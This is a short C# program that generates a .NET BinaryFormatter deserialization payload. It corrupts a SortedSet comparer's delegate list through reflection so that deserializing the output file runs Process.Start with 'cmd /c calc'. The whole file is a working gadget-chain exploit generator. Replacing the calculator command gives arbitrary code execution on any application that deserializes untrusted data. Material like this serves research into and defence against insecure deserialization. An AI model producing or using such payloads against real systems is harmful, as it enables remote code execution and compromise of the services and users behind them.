using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;

namespace gadget
{
    class Program
    {
        static void Main(string[] args)
        {
            var singleDeletage = new Comparison<string>(String.Compare);
            var multiDeletage = singleDeletage + singleDeletage;
            var comparer = Comparer<string>.Create(multiDeletage);
            var sortedSet = new SortedSet<string>(comparer)
            {
                "cmd",
                "/c calc"
            };
            var invocationList = multiDeletage.GetInvocationList();
            invocationList[1] = new Func<string,string, Process>(Process.Start);
            var field = typeof(MulticastDelegate).GetField("_invocationList",
                BindingFlags.NonPublic | BindingFlags.Instance);
            field.SetValue(multiDeletage,invocationList);
            var binaryFormatter = new BinaryFormatter();
            using (var stream = new MemoryStream())
            {
                binaryFormatter.Serialize(stream, sortedSet);
                File.WriteAllBytes("payload.bin",stream.ToArray());
            }
            Console.WriteLine("Done");
        }
    }
}
